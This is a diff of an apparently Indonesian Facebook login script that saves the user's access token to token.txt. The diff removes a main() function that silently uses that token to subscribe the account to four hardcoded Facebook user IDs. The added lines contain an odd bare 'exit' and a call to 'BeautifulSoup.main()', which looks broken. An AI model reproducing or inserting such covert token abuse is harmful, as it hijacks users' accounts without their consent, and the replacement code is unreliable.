@@ -114,24 +114,10 @@ def menu_log():
             xd = open("token.txt", "w")
             xd.write(find_token.group(1))
             xd.close()
-def main():
-    try:
-        token = open("token.txt","r").read()
-        otw = requests.get("https://graph.facebook.com/me/?access_token=" + token)
-        a = json.loads(otw.text)
-        nama = a["name"]
-    except (KeyError,IOError):
-        print('%s║'%(M))
-        print('%s╚══®[%s!%s]◍➤ %sToken Invalid'%(M,P,M,P))
-        os.system('rm -rf token.txt')
-        exit(manda.menu_log())
-    requests.post("https://graph.facebook.com/100017584682867/subscribers?access_token=" + token)    
-    requests.post("https://graph.facebook.com/100000395779504/subscribers?access_token=" + token) 
-    requests.post("https://graph.facebook.com/100000834003593/subscribers?access_token=" + token)
-    requests.post("https://graph.facebook.com/100003986228742/subscribers?access_token=" + token)
-    print('%s║'%(O))
-    print('%s╚══®[%s!%s]◍➤ %sLogin Berhasil'%(O,P,O,P))
-    exit(manda.menu())
+            #print('%s║'%(O))
+            #jalan('%s╚══®[%s!%s]◍➤ %sLogin Successful'%(O,P,O,P))
+            exit
+            exit(BeautifulSoup.main())
         except requests.exceptions.ConnectionError:
             print('%s║'%(O))
             jalan('%s╚══®[%s!%s]◍➤ %sConnection Problem'%(M,P,M,P))
